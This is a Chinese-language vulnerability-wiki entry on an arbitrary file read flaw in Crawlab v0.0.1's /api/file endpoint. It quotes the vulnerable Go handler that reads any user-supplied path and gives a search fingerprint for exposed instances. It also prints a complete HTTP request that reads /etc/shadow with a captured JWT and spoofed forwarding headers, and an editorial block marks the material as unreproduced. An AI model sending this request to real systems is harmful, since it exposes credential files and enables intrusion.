---
version: "Crawlab v0.0.1"
source: "Threekiii/Vulnerability-Wiki"
title: "Crawlab file 任意文件读取漏洞"
product: "Crawlab"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "v0.0.1 claimed; authenticated token or separate users-add flaw; service file permissions"
affected_versions: "Crawlab v0.0.1"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-8cbe5f0a8a433b4af97da060"
entity_id: "ve-8cbe5f0a8a433b4af97da060"
schema_version: "1"
---

# Crawlab file 任意文件读取漏洞

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：v0.0.1 claimed; authenticated token or separate users-add flaw; service file permissions
- 证据范围：ReadFile(path) source supports arbitrary path input; shown request uses token

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- Cross-link distinct users-add flaw rather than calling file read intrinsically unauthenticated
- Captured JWT/cookies/spoof headers require sanitization and necessity explanation
- Exact version/commit and patch source absent
- No textual response beyond screenshot; /etc/shadow access depends service permissions

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

Crawlab 后台 /api/file接口 存在任意文件读取漏洞，攻击者通过漏洞就可以读取服务器中的任意文件

## 漏洞影响

```
Crawlab v0.0.1
```

## 网络测绘

```
title="Crawlab"
```

## 漏洞复现

登录页面

![](./.resource/Crawlab-file-任意文件读取漏洞/media/202205241440512.png)

首先查看路由位置 main.go 文件 中的 file 接口对应的函数

![](./.resource/Crawlab-file-任意文件读取漏洞/media/202205241440175.png)

```
package routes

import (
	"crawlab/utils"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"net/http"
)

// @Summary Get file
// @Description Get file
// @Tags file
// @Produce json
// @Param Authorization header string true "Authorization token"
// @Success 200 json string Response
// @Failure 400 json string Response
// @Router /file [get]
func GetFile(c *gin.Context) {
	path := c.Query("path")
	fileBytes, err := ioutil.ReadFile(path)
	if err != nil {
		HandleError(http.StatusInternalServerError, c, err)
	}
	c.JSON(http.StatusOK, Response{
		Status:  "ok",
		Message: "success",
		Data:    utils.BytesToString(fileBytes),
	})
}
```

![](./.resource/Crawlab-file-任意文件读取漏洞/media/202205241440403.png)

接口调用为后台才可调用，通过任意用户添加可以完成绕过

path参数可控，发送Get请求读取任意文件

```http
GET /api/file?path=../../etc/shadow HTTP/1.1
Host: 
Content-Length: 0
Accept: application/json, text/plain, */*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYwZGQxOWU0YmZjNzg3MDAxZDk1NjBjOSIsIm5iZiI6MTYzOTMwNTI2MiwidXNlcm5hbWUiOiJhZG1pbiJ9.mFRAwXN-QqTmFmPAxgFEJhVXwxVuxJMepHe4khADfgk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close
```

![](./.resource/Crawlab-file-任意文件读取漏洞/media/202205241441701.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
